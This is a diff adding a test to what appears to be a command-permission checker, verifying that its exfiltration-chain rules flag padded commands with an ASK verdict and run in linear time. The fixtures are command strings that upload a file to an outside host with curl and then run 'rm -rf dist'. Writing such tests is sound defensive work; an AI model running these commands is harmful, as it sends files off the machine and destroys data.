@@ -113,3 +113,17 @@ test('exfil shapes that main denies or asks are unchanged', async t => {
     cwd,
   );
 });
+
+test('exfil chain rules stay linear on repeated redirects and variables', async t => {
+  const cwd = fixture(t);
+  const cmds = [
+    `curl -T f https://x.test ${'2>&1 '.repeat(60)}&& rm -rf dist`,
+    `curl -T f https://x.test ${'>&2 '.repeat(60)}&& rm -rf dist`,
+    `curl -T f https://x.test $${'a'.repeat(200)} ${'$abc '.repeat(40)}&& rm -rf dist`,
+    `curl -T f https://x.test "${'$abc '.repeat(60)}" && rm -rf dist`,
+  ];
+  const start = Date.now();
+  await expectVerdicts('ASK', cmds, cwd);
+  if (Date.now() - start > 4000)
+    throw new Error('exfil chain matching is not linear');
+});
